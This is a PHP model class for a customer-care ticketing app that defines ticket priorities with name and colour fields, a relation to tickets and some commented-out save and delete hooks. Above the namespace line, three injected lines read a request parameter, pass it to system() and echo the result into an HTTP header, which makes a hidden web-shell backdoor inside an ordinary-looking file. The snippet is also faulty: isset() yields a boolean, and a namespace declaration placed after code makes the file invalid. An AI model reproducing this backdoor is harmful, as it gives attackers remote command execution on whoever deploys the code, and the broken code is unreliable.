<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class Model_TicketPriority extends \Model_Table { 
	var $table= "customerCareApp_ticketpriority";
	function init(){
		parent::init();

		// $this->hasOne('customerCareApp/Config','config_id');

		$this->addField('name');
		$this->addField('color');

		$this->hasMany('customerCareApp/Ticket','ticketpriority_id');

		// $this->addHook('beforeDelete',$this);
		// $this->addHook('beforeSave',$this);

		$this->add('dynamic_model/Controller_AutoCreator');
	}
	// function beforeDelete(){

	// }

	// function beforeSave(){
	// 	$old_priority=$this->add('customerCareApp/Model_TicketPriority');
	// 	if($this->loaded())
	// 		$old_priority->addCondition('id','<>',$this->id);
	// 	$old_priority->addCondition('name',$this['name']);
	// 	$old_priority->tryLoadAny();
	// 	if($old_priority->loaded())
	// 		throw $this->exception("Already Exists!!");
	// }
}
